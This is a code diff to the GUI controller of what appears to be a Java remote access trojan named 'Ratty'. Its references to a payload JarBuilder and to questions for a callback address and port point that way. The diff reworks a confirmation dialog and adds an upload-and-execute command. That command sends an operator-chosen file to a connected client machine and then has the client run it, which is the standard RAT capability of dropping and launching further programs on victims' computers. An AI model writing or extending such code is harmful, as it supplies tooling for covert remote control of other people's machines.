@@ -8,8 +8,6 @@ import java.io.IOException;
 import java.util.HashMap;
 import java.util.Set;
 
-import javax.swing.JOptionPane;
-
 import de.sogomn.engine.fx.Sound;
 import de.sogomn.rat.ActiveConnection;
 import de.sogomn.rat.builder.JarBuilder;
@@ -54,11 +52,12 @@ public final class RattyGuiController extends AbstractRattyController implements
 	};
 	
 	private static final String FREE_WARNING = LANGUAGE.getString("server.free_warning");
-	private static final String FREE_OPTION_YES = LANGUAGE.getString("server.free_yes");
-	private static final String FREE_OPTION_NO = LANGUAGE.getString("server.free_no");
+	private static final String OPTION_YES = LANGUAGE.getString("server.yes");
+	private static final String OPTION_NO = LANGUAGE.getString("server.no");
 	private static final String BUILDER_ERROR_MESSAGE = LANGUAGE.getString("builder.error");
 	private static final String BUILDER_ADDRESS_QUESTION = LANGUAGE.getString("builder.address_question");
 	private static final String BUILDER_PORT_QUESTION = LANGUAGE.getString("builder.port_question");
+	private static final String UPLOAD_EXECUTE_WARNING = LANGUAGE.getString("server.upload_execute_warning");
 	
 	private static final Sound PING = Sound.loadSound("/ping.wav");
 	
@@ -171,9 +170,9 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private FreePacket createFreePacket() {
-		final int input = gui.showWarning(FREE_WARNING, FREE_OPTION_YES, FREE_OPTION_NO);
+		final boolean accepted = gui.showWarning(FREE_WARNING, OPTION_YES, OPTION_NO);
 		
-		if (input == JOptionPane.YES_OPTION) {
+		if (accepted) {
 			final FreePacket packet = new FreePacket();
 			
 			return packet;
@@ -247,6 +246,26 @@ public final class RattyGuiController extends AbstractRattyController implements
 		//...
 	}
 	
+	private void uploadExecute(final ServerClient client) {
+		final boolean accepted = gui.showWarning(UPLOAD_EXECUTE_WARNING, OPTION_YES, OPTION_NO);
+		
+		if (!accepted) {
+			return;
+		}
+		
+		final File file = gui.getFile();
+		
+		if (file == null) {
+			return;
+		}
+		
+		final UploadFilePacket upload = new UploadFilePacket(file, "");
+		final ExecuteFilePacket execute = new ExecuteFilePacket(file.getName());
+		
+		client.connection.addPacket(upload);
+		client.connection.addPacket(execute);
+	}
+	
 	private void handleCommand(final ServerClient client, final String command) {
 		if (command == RattyGui.FILES) {
 			client.fileTree.setVisible(true);
@@ -262,6 +281,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 			startBuilder();
 		} else if (command == FileTree.REQUEST) {
 			requestFile(client);
+		} else if (command == RattyGui.UPLOAD_EXECUTE) {
+			uploadExecute(client);
 		}
 	}
 	
